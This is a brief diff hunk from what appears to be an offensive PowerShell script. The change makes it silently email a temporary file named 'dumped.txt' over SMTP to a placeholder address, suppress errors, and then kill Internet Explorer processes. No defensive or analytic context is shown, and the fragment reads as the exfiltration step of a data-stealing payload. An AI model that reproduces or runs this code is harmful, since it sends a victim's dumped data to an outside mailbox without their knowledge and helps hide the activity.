@@ -29,7 +29,7 @@ function Send-ToEmail([string]$email, [string]$attachmentpath){
     $smtp.send($message);
     $attachment.Dispose();
  }
-Send-ToEmail  -email "to-address-email" -attachmentpath $path 2>$null;
+Send-ToEmail  -email "to-address-email" -attachmentpath $env:temp\dumped.txt 2>$null;
 Start-Sleep -Seconds 10
 Get-Process -Name iexplore | Stop-Process
 
